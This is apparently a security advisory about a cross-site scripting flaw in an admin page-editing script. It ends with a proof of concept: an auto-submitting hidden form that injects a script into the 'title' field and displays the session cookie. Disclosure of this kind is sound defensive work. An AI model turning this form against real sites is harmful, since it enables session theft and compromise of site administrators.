Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "/admin/edit.php" script to properly sanitize user-supplied input in "title" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/edit.php?what=PAGE_ID" method="post" name="main">
<input type="hidden" name="title" value='About"><script>alert(document.cookie)</script>'>
<input type="hidden" name="article" value="page html">
<input type="hidden" name="myinclude" value="">
<input type="hidden" name="description" value="">
<input type="hidden" name="keywords" value="">
<input type="hidden" name="Submit" value="Submit">
</form>
<script>
document.main.submit();
</script>
